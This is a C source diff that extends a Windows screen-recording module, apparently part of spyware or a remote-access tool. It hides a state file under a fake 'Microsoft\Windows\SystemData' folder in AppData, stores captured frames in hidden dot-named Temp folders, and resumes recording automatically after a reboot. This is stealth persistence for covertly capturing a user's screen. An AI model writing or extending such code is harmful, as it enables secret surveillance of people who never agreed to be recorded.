@@ -2920,14 +2920,10 @@ static void save_screenrecord_state() {
     char appdata_path[MAX_PATH];
     // Use AppData instead of Temp so state persists across reboots
     if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path))) {
-        sprintf(state_path, "%s\\Microsoft\\Windows\\SystemData\\.screenrec_state.dat", appdata_path);
-        CreateDirectoryA(state_path, NULL);  // Ensure dir exists
-        char* last_slash = strrchr(state_path, '\\');
-        if (last_slash) {
-            *last_slash = '\0';
-            CreateDirectoryA(state_path, NULL);
-            *last_slash = '\\';
-        }
+        char state_dir[MAX_PATH];
+        sprintf(state_dir, "%s\\Microsoft\\Windows\\SystemData", appdata_path);
+        CreateDirectoryA(state_dir, NULL);
+        sprintf(state_path, "%s\\.screenrec_state.dat", state_dir);
     } else {
         char temp_dir[MAX_PATH];
         GetTempPathA(MAX_PATH, temp_dir);
@@ -2936,8 +2932,8 @@ static void save_screenrecord_state() {
     
     FILE* f = fopen(state_path, "w");
     if (f) {
-        // Save enabled state so we auto-start on next run
-        fprintf(f, "%d\n", g_screenrecord_enabled ? 1 : 0);
+        // Save enabled state AND recording path for resume after restart
+        fprintf(f, "%d\n%s\n", g_screenrecord_enabled ? 1 : 0, g_screenrecord_path);
         fclose(f);
     }
 }
@@ -2956,9 +2952,20 @@ static void load_screenrecord_state() {
     FILE* f = fopen(state_path, "r");
     if (f) {
         int enabled = 0;
-        if (fscanf(f, "%d", &enabled) == 1 && enabled) {
-            // Auto-start recording on startup if it was enabled
-            g_screenrecord_enabled = 1;
+        char saved_path[MAX_PATH] = {0};
+        if (fscanf(f, "%d\n", &enabled) == 1) {
+            // Read the saved recording path
+            if (fgets(saved_path, sizeof(saved_path), f)) {
+                saved_path[strcspn(saved_path, "\r\n")] = 0;
+                // Restore path if file/directory still exists
+                if (strlen(saved_path) > 0) {
+                    strcpy(g_screenrecord_path, saved_path);
+                }
+            }
+            if (enabled) {
+                // Auto-start recording on startup if it was enabled
+                g_screenrecord_enabled = 1;
+            }
         }
         fclose(f);
     }
@@ -2986,14 +2993,31 @@ DWORD WINAPI screenrecord_thread(LPVOID param) {
     char temp_dir[MAX_PATH];
     GetTempPathA(MAX_PATH, temp_dir);
     
-    // Generate unique filename - we'll create a folder for JPEG frames
     char frames_dir[MAX_PATH];
-    DWORD tick = GetTickCount();
-    sprintf(frames_dir, "%s\\.screenrec_%d", temp_dir, tick);
-    CreateDirectoryA(frames_dir, NULL);
     
-    // Store the directory path for later retrieval
-    sprintf(g_screenrecord_path, "%s\\.screenrec_%d.zip", temp_dir, tick);
+    // Check if we have an existing recording path to continue
+    if (strlen(g_screenrecord_path) > 0) {
+        // Extract frames directory from zip path (remove .zip extension)
+        strcpy(frames_dir, g_screenrecord_path);
+        char* zip_ext = strstr(frames_dir, ".zip");
+        if (zip_ext) *zip_ext = '\0';
+        
+        // Check if directory exists, if not create it
+        if (GetFileAttributesA(frames_dir) == INVALID_FILE_ATTRIBUTES) {
+            CreateDirectoryA(frames_dir, NULL);
+        }
+    } else {
+        // Generate unique filename - we'll create a folder for JPEG frames
+        DWORD tick = GetTickCount();
+        sprintf(frames_dir, "%s\\.screenrec_%d", temp_dir, tick);
+        CreateDirectoryA(frames_dir, NULL);
+        
+        // Store the directory path for later retrieval
+        sprintf(g_screenrecord_path, "%s\\.screenrec_%d.zip", temp_dir, tick);
+    }
+    
+    // Save state so path persists across restarts
+    save_screenrecord_state();
     
     // Get primary monitor dimensions (same method as screenshot - most reliable)
     int screen_width = GetSystemMetrics(SM_CXSCREEN);
@@ -3029,6 +3053,24 @@ DWORD WINAPI screenrecord_thread(LPVOID param) {
     
     BYTE* pixels = (BYTE*)malloc(stride * record_height);
     if (!pixels) goto cleanup;
+    
+    // Find the next frame number if continuing a previous recording
+    WIN32_FIND_DATAA find_data;
+    char search_pattern[MAX_PATH];
+    sprintf(search_pattern, "%s\\frame_*.bmp", frames_dir);
+    HANDLE find_handle = FindFirstFileA(search_pattern, &find_data);
+    if (find_handle != INVALID_HANDLE_VALUE) {
+        do {
+            // Extract frame number from filename
+            DWORD num = 0;
+            if (sscanf(find_data.cFileName, "frame_%d.bmp", &num) == 1) {
+                if (num >= frame_num) {
+                    frame_num = num + 1;  // Continue from next frame
+                }
+            }
+        } while (FindNextFileA(find_handle, &find_data));
+        FindClose(find_handle);
+    }
     
     // Store frames directory path in a temp file for later
     char frames_info[MAX_PATH];
